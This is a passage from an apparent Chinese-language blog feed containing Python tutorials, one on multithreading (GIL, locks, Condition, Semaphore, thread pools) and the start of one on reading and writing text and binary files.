desc)thread1.start()thread2.start()thread1.join()thread2.join()print total</code></pre><p>上面这个程序你每运行一次得到而结果都不一样，说明并不是执行完一个再执行另一个，也就是说GIL会在中间释放，交给另一个线程。</p><p><strong>那么一般在什么情况下释放?</strong></p><p>一般是在执行一定行数的字节码或者执行一定时间，或者遇到I&#x2F;O操作（因为I&#x2F;O操作的时间非常长，程序不会等待）</p><h2 id="二、多线程编程"><a href="#二、多线程编程" class="headerlink" title="二、多线程编程"></a><strong>二、多线程编程</strong></h2><h3 id="方法一：通过Thread类实例化"><a href="#方法一：通过Thread类实例化" class="headerlink" title="方法一：通过Thread类实例化"></a><strong>方法一：通过Thread类实例化</strong></h3><p>我们可以以一个爬虫的例子来理解，我们可以用一个线程来爬去某网站的列表页，另一个线程根据这个列表来爬去详情页，两者同时进行效率很高（为什么能同时进行呢？因为我们的socket编程也是属于网络I&#x2F;O编程的一种）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import timeimport threadingdef show_html_detail(url):    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(url):    print &quot;get url detail start\n&quot;    time.sleep(2)    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail,args=(&quot;&quot;,))    thread2 = threading.Thread(target=show_html_detail,args=(&quot;&quot;,))    start_time = time.time()    thread1.start()    thread2.start()    print &quot;last time &#123;&#125;\n&quot;.format(time.time()-start_time)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">get url detail startget html detail startlast time 0.0get html detail endget url detail end</code></pre><p><strong>解释：</strong></p><p>为什么是0s 呢？如果是并行的应该是两秒，其实是因为我们这里有三个线程，其中有一个是主线程，这里是主线程和子线程同时运行，，主线程运行结束以后就打印了这句话，子线程继续运行，输出了后面的 end</p><h4 id="需求一："><a href="#需求一：" class="headerlink" title="需求一："></a><strong>需求一：</strong></h4><p>那么我们其实希望主线程运行完（和退出不一样）后子线程也一起结束，我们可以设置子线程为守护线程，即thread.steDaemon(True)，守护线程会在主线程结束后跟随主线程结束（主线程结束：主线程所在的进程中的所有非守护线程都结束）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import timeimport threadingdef show_html_detail(url):    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(url):    print &quot;get url detail start\n&quot;    time.sleep(2)    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail,args=(&quot;&quot;,))    thread2 = threading.Thread(target=show_html_detail,args=(&quot;&quot;,))    start_time = time.time()    thread1.setDaemon(True)    thread2.setDaemon(True)    thread1.start()    thread2.start()    print &quot;last time &#123;&#125;\n&quot;.format(time.time()-start_time)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">get url detail startget html detail startlast time 0.0</code></pre><p>可见，end 并没有输出来，说明子线程在主线程结束时被强制结束了</p><p>我们尝试关闭一个守护线程并延长另一个守护线程的时间再次验证一下</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import timeimport threadingdef show_html_detail(url):    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(url):    print &quot;get url detail start\n&quot;    time.sleep(4)                       #注意这里对守护线程的时间进行了修改    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail,args=(&quot;&quot;,))    thread2 = threading.Thread(target=show_html_detail,args=(&quot;&quot;,))    start_time = time.time()    thread1.setDaemon(True)    thread1.start()    thread2.start()    print &quot;last time &#123;&#125;\n&quot;.format(time.time()-start_time)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">get url detail startget html detail startlast time 0.00100016593933get html detail end</code></pre><p>可以看到守护线程并没有输出，我们的分析是正确的</p><h4 id="需求二："><a href="#需求二：" class="headerlink" title="需求二："></a><strong>需求二：</strong></h4><p>我们其实希望我们子线程和主线程不要并发运行，主线程等等子线程运行结束再运行，于是Python也给我们提供的对应的方法，join() 主线程阻塞方法,使用以后主线程就会被阻塞等待子线程运行</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import timeimport threadingdef show_html_detail(url):    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(url):    print &quot;get url detail start\n&quot;    time.sleep(2)    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail,args=(&quot;&quot;,))    thread2 = threading.Thread(target=show_html_detail,args=(&quot;&quot;,))    start_time = time.time()    #thread1.setDaemon(True)    #thread2.setDaemon(True)    thread1.start()    thread2.start()    thread1.join()    thread2.join()    print &quot;last time &#123;&#125;\n&quot;.format(time.time()-start_time)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">get url detail startget html detail startget url detail endget html detail endlast time 2.00100016594</code></pre><p><strong>解释：</strong></p><p>可以看到我们的确在2s 左右运行结束了两个线程，实现了并发，（如果我们将其中一个线程的时间设置为4那么我们最后的时间将会是4s左右，也就是多个线程的最常时间）</p><h3 id="方法二：通过继承Thread类实现多线程"><a href="#方法二：通过继承Thread类实现多线程" class="headerlink" title="方法二：通过继承Thread类实现多线程"></a><strong>方法二：通过继承Thread类实现多线程</strong></h3><pre><code class="hljs">import timeimport threadingclass Get_html_detail(threading.Thread):    def __init__(self,name):        super(Get_html_detail,self).__init__(name = name)    def run(self):        print &quot;get html detail start\n&quot;        time.sleep(2)        print &quot;get html detail end\n&quot;class Get_url_dtail(threading.Thread):    def __init__(self, name):        super(Get_url_dtail,self).__init__(name = name)    def run(self):        print &quot;get url detail start\n&quot;        time.sleep(2)        print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = Get_url_dtail(&quot;show_url_detail&quot;)    thread2 = Get_html_detail(&quot;show_html_detail&quot;)    start_time = time.time()    thread1.start()    thread2.start()    thread1.join()    thread2.join()    print &quot;last time &#123;&#125;\n&quot;.format(time.time()-start_time)</code></pre><h2 id="三、线程间通信"><a href="#三、线程间通信" class="headerlink" title="三、线程间通信"></a><strong>三、线程间通信</strong></h2><h3 id="为什么需要线程间的通信呢？"><a href="#为什么需要线程间的通信呢？" class="headerlink" title="为什么需要线程间的通信呢？"></a><strong>为什么需要线程间的通信呢？</strong></h3><p>我们上面说过，在爬虫的爬取URL线程爬取成功以后，我们需要将爬取到的线程丢给另一个爬取文章详情页的线程，这时候就需要使用到 Python的线程间通信</p><h3 id="方法一：共享变量"><a href="#方法一：共享变量" class="headerlink" title="方法一：共享变量"></a><strong>方法一：共享变量</strong></h3><p>设置一个全局变量实现多个线程之间的通信</p><pre><code class="hljs">import timeimport threadingdetail_url_list = []def show_html_detail():    global detail_url_list    url = detail_url_list.pop() # 注意这里没有在函数中写循环，而是选择在主函数中国实现循环多线程提高效率    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail():    global detail_url_list    print &quot;get url detail start\n&quot;    time.sleep(2)    for i in xrange(20):        detail_url_list.append(&quot;http://www.threadtest.com/&#123;id&#125;&quot;.format(id = i))    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail)    thread1.start()    thread1.join()    for i in xrange(20):        thread2 = threading.Thread(target=show_html_detail)        thread2.start()        thread2.join()</code></pre><p><strong>实际上可以直接使用传参的方式：</strong></p><pre><code class="hljs">import timeimport threadingdetail_url_list = []def show_html_detail(detail_url_list):    url = detail_url_list.pop()    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(detail_url_list):    print &quot;get url detail start\n&quot;    time.sleep(2)    for i in xrange(20):        detail_url_list.append(&quot;http://www.threadtest.com/&#123;id&#125;&quot;.format(id = i))    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    thread1 = threading.Thread(target=show_url_detail,args=(detail_url_list,))    start_time = time.time()    thread1.start()    thread1.join()    for i in xrange(20):        thread2 = threading.Thread(target=show_html_detail,args=(detail_url_list,))        thread2.start()        thread2.join()    print &quot;last time &#123;&#125;\n&quot;.format(time.time() - start_time)</code></pre><p>但是使用Pop 方法其实并不是线程安全的，我们还是需要在上面加一把锁</p><h3 id="方法二：线程队列"><a href="#方法二：线程队列" class="headerlink" title="方法二：线程队列"></a><strong>方法二：线程队列</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">import Queueimport timeimport threadingdef show_html_detail(queue):    url = queue.get()#这是一个阻塞的操作，当队列为空的时候会阻塞,所以我们不用 join    print &quot;get html detail start\n&quot;    time.sleep(2)    print &quot;get html detail end\n&quot;def show_url_detail(queue):    print &quot;get url detail start\n&quot;    time.sleep(2)    for i in xrange(20):        queue.put(&quot;http://www.threadtest.com/&#123;id&#125;&quot;.format(id=i))    print &quot;get url detail end\n&quot;if __name__ == &#39;__main__&#39;:    detail_url_queue = Queue(maxsize=1000)    thread1 = threading.Thread(target=show_url_detail, args=(detail_url_queue,))    start_time = time.time()    thread1.start()    for i in xrange(20):        thread2 = threading.Thread(target=show_html_detail, args=(detail_url_queue,))        thread2.start()    print &quot;last time &#123;&#125;\n&quot;.format(time.time() - start_time)</code></pre><h2 id="四、线程同步"><a href="#四、线程同步" class="headerlink" title="四、线程同步"></a><strong>四、线程同步</strong></h2><h3 id="1-为什么要线程同步？"><a href="#1-为什么要线程同步？" class="headerlink" title="1.为什么要线程同步？"></a><strong>1.为什么要线程同步？</strong></h3><p>我们用之前的一个例子给大家分析一下</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import disdef add(a):    a += 1def desc(a):    a -= 1print dis.dis(add)print dis.dis(desc)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">  5           0 LOAD_FAST                0 (a)              3 LOAD_CONST               1 (1)              6 INPLACE_ADD                       7 STORE_FAST               0 (a)             10 LOAD_CONST               0 (None)             13 RETURN_VALUE        None  8           0 LOAD_FAST                0 (a)              3 LOAD_CONST               1 (1)              6 INPLACE_SUBTRACT                  7 STORE_FAST               0 (a)             10 LOAD_CONST               0 (None)             13 RETURN_VALUE        None</code></pre><p><strong>解释：</strong></p><p>可以发现要执行这两个函数实际上在底层运行了四个步骤</p><pre><code class="hljs">1.load a 2.load 13.+/-操作4.赋值给a </code></pre><p>那么在这个过程中GIL随时都能进行切换，就会造成最后赋值的混乱，这种场景在web 开发，特别是电商网站的开发中出现的概率非常大，因为很多人会同时减库存</p><h3 id="2-怎样实现线程同步"><a href="#2-怎样实现线程同步" class="headerlink" title="2.怎样实现线程同步"></a><strong>2.怎样实现线程同步</strong></h3><h4 id="1-加锁"><a href="#1-加锁" class="headerlink" title="(1)加锁"></a><strong>(1)加锁</strong></h4><p>python 为我们提供了一些锁的机制，最常见的就是 from threading import Lock</p><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8import threadingfrom threading import Locktotal = 0lock = Lock()  # 声明一把锁def add():    global total    global lock    for i in xrange(100000):        lock.acquire()        total += 1        lock.release() #一定要去释放这个锁，要不然程序就无法继续运行了def desc():    global total    global lock    for i in xrange(100000):        lock.acquire()        total -= 1        lock.release()thread1 = threading.Thread(target=add)thread2 = threading.Thread(target=desc)thread1.start()thread2.start()thread1.join()thread2.join()print total</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">0       </code></pre><p><strong>解释：</strong></p><p>这样无论怎么运行结果都是0了，有了锁以后我们就能实现代码段的交替运行，但是锁会影响性能</p><h4 id="2-锁会引起死锁"><a href="#2-锁会引起死锁" class="headerlink" title="(2)锁会引起死锁"></a><strong>(2)锁会引起死锁</strong></h4><p>如果我们在 acquire() 里面再次 acquire() 就会引起互相的等待造成死锁，因此我们使用锁的时候要格外的小心</p><h4 id="3-可重入的锁-RLock"><a href="#3-可重入的锁-RLock" class="headerlink" title="(3)可重入的锁 RLock"></a><strong>(3)可重入的锁 RLock</strong></h4><p>有了这个锁我们就能在一个线程里面调用多次 acquire() （注意：调用 acquire()的此时一定要和 release()保持一致）</p><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8import threadingfrom threading import RLocktotal = 0lock = RLock()  # 声明一把锁def add():    global total    global lock    for i in xrange(100000):        lock.acquire()        lock.acquire()        total += 1        lock.release() #一定要去释放这个锁，要不然程序就无法继续运行了        lock.release()def desc():    global total    global lock    for i in xrange(100000):        lock.acquire()        total -= 1        lock.release()thread1 = threading.Thread(target=add)thread2 = threading.Thread(target=desc)thread1.start()thread2.start()thread1.join()thread2.join()print total</code></pre><h2 id="五、多线程中的condition"><a href="#五、多线程中的condition" class="headerlink" title="五、多线程中的condition"></a><strong>五、多线程中的condition</strong></h2><p>condition—&gt; 条件变量，用于复杂的线程间同步</p><h3 id="1-Lock-能否实现协同读诗？"><a href="#1-Lock-能否实现协同读诗？" class="headerlink" title="1.Lock 能否实现协同读诗？"></a><strong>1.Lock 能否实现协同读诗？</strong></h3><p>一般来讲这个东西的使用是在完成类似对话的操作的时候，比如天猫精灵和小爱的对话，但是这个你一句我一句的形式感觉 lock 也能完成，我们先实验一下.</p><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8import threadingfrom threading import Lockclass XiaoAi(threading.Thread):    def __init__(self,lock):        super(XiaoAi,self).__init__(name = &quot;小爱&quot;)        self.lock = lock    def run(self):        self.lock.acquire()        print &quot;&#123;name&#125;:哎&quot;.format(name = &quot;小爱&quot;)        self.lock.release()        self.lock.acquire()        print &quot;&#123;name&#125;:好啊&quot;.format(name=&quot;小爱&quot;)        self.lock.release()class TianMao(threading.Thread):    def __init__(self,lock):        super(TianMao,self).__init__(name = &quot;天猫精灵&quot;)        self.lock = lock    def run(self):        self.lock.acquire()        print &quot;&#123;name&#125;:小爱同学&quot;.format(name = &quot;天猫精灵&quot;)        self.lock.release()        self.lock.acquire()        print &quot;&#123;name&#125;:我们来对古诗吧&quot;.format(name = &quot;天猫精灵&quot;)        self.lock.release()if __name__ == &#39;__main__&#39;:    lock = Lock()    xiaoai = XiaoAi(lock)    tianmao = TianMao(lock)    tianmao.start()    xiaoai.start()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">天猫精灵:小爱同学天猫精灵:我们来对古诗吧小爱:哎小爱:好啊</code></pre><p>我们发现，天猫精灵把话都说了然后才给了小爱，这并不是我们想要的结果</p><h3 id="2-condition-实现协同操作"><a href="#2-condition-实现协同操作" class="headerlink" title="2.condition 实现协同操作"></a><strong>2.condition 实现协同操作</strong></h3><p>condition 的锁的机制实际上还是使用的是 RLock 中的 acquire() 和 release() ,而condition中的 wait 和 notify 才是他的精髓所在</p><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8import threadingfrom threading import Conditionclass XiaoAi(threading.Thread):    def __init__(self,cond):        super(XiaoAi,self).__init__(name = &quot;小爱&quot;)        self.cond = cond    def run(self):        with self.cond:            self.cond.wait()            print &quot;&#123;name&#125;:哎&quot;.format(name = &quot;小爱&quot;)            self.cond.notify()            self.cond.wait()            print &quot;&#123;name&#125;:好啊&quot;.format(name=&quot;小爱&quot;)            self.cond.notify()class TianMao(threading.Thread):    def __init__(self,cond):        super(TianMao,self).__init__(name = &quot;天猫精灵&quot;)        self.cond = cond    def run(self):        with self.cond:            print &quot;&#123;name&#125;:小爱同学&quot;.format(name = &quot;天猫精灵&quot;)            self.cond.notify()            self.cond.wait()            print &quot;&#123;name&#125;:我们来对古诗吧&quot;.format(name = &quot;天猫精灵&quot;)            self.cond.notify()            self.cond.wait()if __name__ == &#39;__main__&#39;:    cond = Condition()    xiaoai = XiaoAi(cond)    tianmao = TianMao(cond)    xiaoai.start()            # 注意这里的顺序和之前的代码不同    tianmao.start()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">天猫精灵:小爱同学小爱:哎天猫精灵:我们来对古诗吧小爱:好啊</code></pre><blockquote><p><strong>解释：</strong></p><p>1.使用 condition 的时候执行的先后顺序是一定不能弄错的，否则就会出现执行不下去的情况，比如我们先启动天猫精灵，那么我们的 Notify 就已经在小爱没有启动的时候就发出去了，小爱就永远收不到天猫的请求，于是对话就陷入的僵局</p><p>2.使用了 with 语句，就相当于调用了两个魔法方法，就不用单独写 self.cond.acquire() 和 self.cond.release() 了。（必须在 调用了 with 以后才能调用 self.cond.wait() 和 self.cond.notify()）</p></blockquote><h2 id="六、可控数量的线程同步机制：Semaphore"><a href="#六、可控数量的线程同步机制：Semaphore" class="headerlink" title="六、可控数量的线程同步机制：Semaphore"></a><strong>六、可控数量的线程同步机制：Semaphore</strong></h2><p>Semaphore（信号量） 是另一个线程同步机制，是一种用于控制进入数量的锁</p><h3 id="什么时候会用到这个机制呢？"><a href="#什么时候会用到这个机制呢？" class="headerlink" title="什么时候会用到这个机制呢？"></a><strong>什么时候会用到这个机制呢？</strong></h3><p>1.比如我们做爬虫，我们想控制线程的最大数量，这样就能防止被反爬<br>2.比如我们想要控制对一个文件的读取线程的数量不能超过某一个值</p><h3 id="没有使用前的例子"><a href="#没有使用前的例子" class="headerlink" title="没有使用前的例子"></a><strong>没有使用前的例子</strong></h3><p><strong>代码示例：</strong></p><pre><code class="hljs">import threadingimport timeclass HtmlSpider(threading.Thread):    def __init__(self,url):        super(HtmlSpider,self).__init__()        self.url = url    def run(self):        time.sleep(2)        print &quot;got html successfully\n&quot;class UrlProducer(threading.Thread):    def run(self):        for i in xrange(20):            html_thread = HtmlSpider(&quot;http://www.html_spider.com/&#123;id&#125;&quot;.format(id = i))            html_thread.start()if __name__ == &#39;__main__&#39;:    url_producer = UrlProducer()    url_producer.start()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">got html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfullygot html successfully</code></pre><p>这里现在有20个线程，但是如果我们有这样的需求，我们希望每并发的数量不超过3个，那么我们就要使用到Semaphore</p><p><strong>代码示例：</strong></p><pre><code class="hljs"># coding=utf-8import threadingimport timeclass HtmlSpider(threading.Thread):    def __init__(self,url,sem):        super(HtmlSpider,self).__init__()        self.url = url        self.sem = sem    def run(self):        time.sleep(2)        print &quot;got html successfully\n&quot;        self.sem.release() # 在这里释放----------------&gt;注意一定要在执行完全结束以后释放class UrlProducer(threading.Thread):    def __init__(self,sem):        super(UrlProducer,self).__init__()        self.sem = sem    def run(self):        for i in xrange(20):            self.sem.acquire() # 在这里上锁            html_thread = HtmlSpider(&quot;http://www.html_spider.com/&#123;id&#125;&quot;.format(id = i),self.sem)            html_thread.start()            ## self.sem.release()  # 在这里释放 -----------&gt;这里释放还是20个并发，因为没在执行完毕的时候释放，start()执行后还要等函数执行完毕if __name__ == &#39;__main__&#39;:    sem = threading.Semaphore(3)    url_producer = UrlProducer(sem)    url_producer.start()</code></pre><blockquote><p><strong>解释：</strong></p><p>Semaphore 底层是调用condition 实现的，sem.acquire() 会记录数量，满三个就上锁，解锁一个数字就减一</p></blockquote><h2 id="七、线程池concurrent-futures-Python-3"><a href="#七、线程池concurrent-futures-Python-3" class="headerlink" title="七、线程池concurrent.futures(Python 3)"></a><strong>七、线程池concurrent.futures(Python 3)</strong></h2><h3 id="1-为什么要用线程池？"><a href="#1-为什么要用线程池？" class="headerlink" title="1.为什么要用线程池？"></a><strong>1.为什么要用线程池？</strong></h3><p>线程池能够自动的帮助我们进行线程的调度，而不用我们手动控制，我们有新的线程就丢到线程池中就可以了，减轻了我们的负担，非常方便</p><p>比如：<br>1.我们想在主线程中获取某一个线程或者任务的状态或者返回值<br>2.当一个线程完成的时候主线程能立刻的知道<br>3.futures 可以让多线程和多进程的编码接口一致</p><h4 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a><strong>小试牛刀</strong></h4><p><strong>示例代码:</strong></p><pre><code class="hljs">from concurrent.futures import ThreadPoolExecutorimport timedef get_html(times):    time.sleep(times)    print(&quot;get html &#123;id&#125; successfully&quot;.format(id = times))    return timesif __name__ == &#39;__main__&#39;:    executor = ThreadPoolExecutor(max_workers=2)# 创建一个线程池的执行器    task1 = executor.submit(get_html,(3)) # 将程序丢入线程池    task2 = executor.submit(get_html,(2))    print(task2.done())    time.sleep(3)    print(task2.done())    print(task2.result()) # 获取返回结果</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Falseget html 2 successfullyget html 3 successfullyTrue2</code></pre><blockquote><p><strong>注意：</strong></p><p>线程池对象还有个 cancel()<br>方法能够结束<strong>未开始</strong>执行的线程（注意是未开始执行），因为我们现在允许一下子执行两个线程，所以是没法cancel()<br>掉的，我们如果想cancel() 的话我们可以将这个最多同时执行两个改成同时执行一个吗，这样就能 cancel()了</p></blockquote><h3 id="2-我们想获取到执行成功的task-的返回"><a href="#2-我们想获取到执行成功的task-的返回" class="headerlink" title="2.我们想获取到执行成功的task 的返回"></a><strong>2.我们想获取到执行成功的task 的返回</strong></h3><h4 id="方法一：使用-as-completed"><a href="#方法一：使用-as-completed" class="headerlink" title="方法一：使用 as_completed"></a><strong>方法一：使用 as_completed</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">from concurrent.futures import ThreadPoolExecutorfrom concurrent.futures import as_completedimport timedef get_html(times):    time.sleep(times)    print(&quot;get html &#123;id&#125; successfully&quot;.format(id = times))    return timesif __name__ == &#39;__main__&#39;:    executor = ThreadPoolExecutor(max_workers=2)# 创建一个线程池的执行器    urls = [2,3,4,5,6,7]    tasks = [executor.submit(get_html,(url)) for url in urls]    for future in as_completed(tasks):        data = future.result()        print(&quot;get &#123;data&#125; successfully\n&quot;.format(data = data))</code></pre><h4 id="方法二：使用-executor-自己的-map-方法"><a href="#方法二：使用-executor-自己的-map-方法" class="headerlink" title="方法二：使用 executor 自己的 map 方法"></a><strong>方法二：使用 executor 自己的 map 方法</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">from concurrent.futures import ThreadPoolExecutorfrom concurrent.futures import as_completedimport timedef get_html(times):    time.sleep(times)    print(&quot;get html &#123;id&#125; successfully&quot;.format(id = times))    return timesif __name__ == &#39;__main__&#39;:    executor = ThreadPoolExecutor(max_workers=2)# 创建一个线程池的执行器    urls = [2,3,4,5,6,7]    for data in executor.map(get_html,urls):        print(&quot;get &#123;data&#125; successfully\n&quot;.format(data = data))    </code></pre><h3 id="3-wait-方法申请等待"><a href="#3-wait-方法申请等待" class="headerlink" title="3.wait()方法申请等待"></a><strong>3.wait()方法申请等待</strong></h3><p>wait() 什么线程就会等待这个线程执行完再执行其他的线程</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from concurrent.futures import ThreadPoolExecutorfrom concurrent.futures import as_completedfrom concurrent.futures import waitfrom concurrent.futures import FIRST_COMPLETEDimport timedef get_html(times):    time.sleep(times)    print(&quot;get html &#123;id&#125; successfully&quot;.format(id = times))    return timesif __name__ == &#39;__main__&#39;:    executor = ThreadPoolExecutor(max_workers=2)# 创建一个线程池的执行器    urls = [2,3,4,5,6,7]    tasks = [executor.submit(get_html,(url)) for url in urls]    wait(tasks,return_when=FIRST_COMPLETED)    print(&#39;main&#39;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">get html 2 successfullymainget html 3 successfullyget html 4 successfullyget html 5 successfullyget html 6 successfullyget html 7 successfully</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（文件篇）</title>
    <link href="/2018/10/01/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E6%96%87%E4%BB%B6%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/01/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E6%96%87%E4%BB%B6%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、如何读写文本文件"><a href="#一、如何读写文本文件" class="headerlink" title="一、如何读写文本文件"></a><strong>一、如何读写文本文件</strong></h2><p>这个问题看似简单，但是由于py2 和 py3 的巨大差异导致我们依然要深入研究一下。</p><p> 那么 python2 和 python3 的什么区别导致了这种差异的发生呢？</p><span id="more"></span><blockquote><p> <strong>答：python2 和 python3 之间字符串的语意发生了变化</strong></p></blockquote><p><strong>python2 有两种字符串的类型：</strong></p><p><strong>（1）str</strong> </p><p>表面上看是字符串，但是实际上是抽象的一串连续的字节（字符串中每个字符都是一个字节）</p><p><strong>（2）unicode</strong></p><p>这个类型是在更多不同的语言加入以后不得不进行调整的，不再用一个字节表示一个字符，但是，我们进行文件操作的时候是不支持直接将多个字节一下子存储进去的，我们必须将其转化成某种单个字节的编码再进行存储操作</p><p><strong>示例代码：</strong></p><p>将文字编码：</p><pre><code class="hljs">In [1]: a = u&#39;你好世界&#39;In [2]: a.encode(&#39;utf8&#39;)Out[2]: &#39;\xe4\xbd\xa0\xe5\xa5\xbd\xe4\xb8\x96\xe7\x95\x8c&#39;In [3]: a.encode(&#39;gbk&#39;)Out[3]: &#39;\xc4\xe3\xba\xc3\xca\xc0\xbd\xe7&#39;</code></pre><p>可以看到 utf-8 使用的字节比Gbk多</p><p>将文字解码:</p><p>注意：这里编码和解码一定要对应，否则会出现乱码。</p><p><strong>代码示例：</strong></p><pre><code class="hljs">In [5]: &#39;\xe4\xbd\xa0\xe5\xa5\xbd\xe4\xb8\x96\xe7\x95\x8c&#39;.decode(&#39;gbk&#39;)Out[5]: u&#39;\u6d63\u72b2\u30bd\u6d93\u682b\u666b&#39;In [6]: print u&#39;\u6d63\u72b2\u30bd\u6d93\u682b\u666b&#39;浣犲ソ涓栫晫</code></pre><p><strong>代码示例：</strong></p><pre><code class="hljs">In [8]: &#39;\xe4\xbd\xa0\xe5\xa5\xbd\xe4\xb8\x96\xe7\x95\x8c&#39;.decode(&#39;utf8&#39;)Out[8]: u&#39;\u4f60\u597d\u4e16\u754c&#39;In [9]: print u&#39;\u4f60\u597d\u4e16\u754c&#39;你好世界</code></pre><h3 id="1-python2-的文本读写"><a href="#1-python2-的文本读写" class="headerlink" title="1.python2 的文本读写"></a><strong>1.python2 的文本读写</strong></h3><p>文本就是Unicode 字符串，我们写入文件前先要对其选择一个方式进行编码，我们读取文件的时候也要对其进行先解码，将其换原成 unicode 。</p><p><strong>文本的写入：</strong></p><pre><code class="hljs">f = open(&#39;test.txt&#39;,&#39;w&#39;)s = u&#39;你好世界&#39;f.write(s.encode(&#39;utf8&#39;))</code></pre><p><strong>文本的读出：</strong></p><pre><code class="hljs">In [8]: f = open(&#39;test.txt&#39;,&#39;r&#39;)In [9]: t = f.read()In [10]: tOut[10]: &#39;\xe4\xbd\xa0\xe5\xa5\xbd\xe4\xb8\x96\xe7\x95\x8c&#39;</code></pre><p>可以看到这样读出来的都是字节码</p><p>我们必须要进行转化：</p><pre><code class="hljs">In [11]: t.decode(&#39;utf8&#39;)Out[11]: u&#39;\u4f60\u597d\u4e16\u754c&#39;In [12]: print u&#39;\u4f60\u597d\u4e16\u754c&#39;你好世界</code></pre><h3 id="2-python3-的文本读写"><a href="#2-python3-的文本读写" class="headerlink" title="2.python3 的文本读写"></a><strong>2.python3 的文本读写</strong></h3><p>python3 对字符串的支持更加清晰合理，unicode 就是 python3 中的 str 而 str 就是python3 中的 byte</p><p>就比如说，python2 中字符串前面加一个u 才代表 unicode 字符串但是 python3 什么都不用加直接就是，反倒是如果想成为一个 byte 字符串要加 b </p><p>python3 的读写可以指定一个参数 encoding &#x3D; ‘’ 自动的进行编解码</p><p><strong>文本的写入：</strong></p><pre><code class="hljs">f = open(&#39;test.txt&#39;,&#39;w&#39;,encoding = &#39;utf8&#39;)f.write(&quot;国庆快乐&quot;)</code></pre><p><strong>文本的读出：</strong></p><pre><code class="hljs">f = open(&#39;test.txt&#39;,&#39;r&#39;,encoding=&#39;utf8&#39;)t = f.read()print (t)</code></pre><h2 id="二、如何处理二进制文件"><a href="#二、如何处理二进制文件" class="headerlink" title="二、如何处理二进制文件"></a><strong>二、如何处理二进制文件</strong></h2><p>wav 是音频问价，前44字节是文件的头信息，我们可以尝试将其读出来</p><pre><code class="hljs">In [6]: f = open(&#39;test.wav&#39;,&#39;rb&#39;)In [7]: info = f.read(44)In [8]: infoOut[8]: &#39;RIFFt\x9b\x0b\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x02\x00\x11+\x00\x00D\xac\x00\x00\x04\x00\x10\x00dataP\x9b\x0b\x00&#39;</code></pre><p>那么我们如何将其解析出来呢？<br>我们可以使用 struct 这个库中的unpack 方法</p><p><strong>举个例子：</strong></p><p>h 是一个 short 的意思</p><pre><code class="hljs">import structprint struct.unpack(&#39;h&#39;,&#39;\x01\x02&#39;)//小端序print &#39;\n&#39;print struct.unpack(&#39;&gt;h&#39;,&#39;\x01\x02&#39;)//大端序(513,)//---------&gt;2x256+1(258,)//---------&gt;1x256+2</code></pre><p>比如我们的音频文件的 22-24 字节是声道数，于是我们就能使用这个函数将其解析出来</p><p><strong>代码示例：</strong></p><pre><code class="hljs">import structf = open(&#39;test.wav&#39;,&#39;rb&#39;)info = f.read(44)print struct.unpack(&#39;h&#39;,info[22:24])</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">(2,)</code></pre><p>说明这个音频文件是双声道</p><p>再比如我们想读音频文件的采样频率，这个东西是24-28 4个字节</p><p><strong>代码示例:</strong></p><pre><code class="hljs">import structf = open(&#39;test.wav&#39;,&#39;rb&#39;)info = f.read(44)print 